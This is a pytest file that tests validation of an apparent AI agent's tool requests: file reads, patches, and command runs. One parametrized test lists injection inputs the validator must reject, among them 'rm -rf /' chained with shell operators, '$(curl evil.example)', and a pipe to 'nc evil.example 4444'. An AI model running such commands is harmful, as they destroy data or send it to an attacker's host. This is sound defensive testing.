import pytest
from pydantic import ValidationError

from aigis.domain import ToolName, ToolRequest


def test_read_file_requires_path() -> None:
    with pytest.raises(ValidationError, match="requires 'path'"):
        ToolRequest(tool=ToolName.READ_FILE)


def test_read_file_valid() -> None:
    req = ToolRequest(tool=ToolName.READ_FILE, path="README.md")
    assert req.path == "README.md"
    assert req.request_id  # auto-generated


def test_patch_file_requires_old_and_new_str() -> None:
    with pytest.raises(ValidationError, match="requires 'old_str'"):
        ToolRequest(tool=ToolName.PATCH_FILE, path="src/x.py")


def test_patch_file_old_and_new_must_differ() -> None:
    with pytest.raises(ValidationError, match="must differ"):
        ToolRequest(
            tool=ToolName.PATCH_FILE, path="src/x.py", old_str="a", new_str="a"
        )


def test_run_command_requires_executable() -> None:
    with pytest.raises(ValidationError, match="requires 'executable'"):
        ToolRequest(tool=ToolName.RUN_COMMAND, args=["tests/"])


def test_run_command_valid_arg_list() -> None:
    req = ToolRequest(
        tool=ToolName.RUN_COMMAND, executable="pytest", args=["tests/", "-x"]
    )
    assert req.executable == "pytest"
    assert req.args == ["tests/", "-x"]


@pytest.mark.parametrize(
    "executable,args",
    [
        ("pytest tests/ && rm -rf /", []),
        ("pytest", ["tests/", "&&", "rm -rf /"]),
        ("pytest", ["tests/; rm -rf /"]),
        ("pytest", ["$(curl evil.example)"]),
        ("bash -c", ["'rm -rf /'"]),
        ("pytest", ["`whoami`"]),
        ("pytest", ["tests/ | nc evil.example 4444"]),
    ],
)
def test_run_command_rejects_shell_metacharacters(
    executable: str, args: list[str]
) -> None:
    """This is the structural enforcement of the 'commands as arg lists,
    never shell strings' decision — command injection must be impossible to
    even construct as a valid ToolRequest, not merely filtered downstream.
    """
    with pytest.raises(ValidationError):
        ToolRequest(tool=ToolName.RUN_COMMAND, executable=executable, args=args)


def test_tool_request_is_frozen() -> None:
    req = ToolRequest(tool=ToolName.READ_FILE, path="README.md")
    with pytest.raises(ValidationError):
        req.path = "other.md"
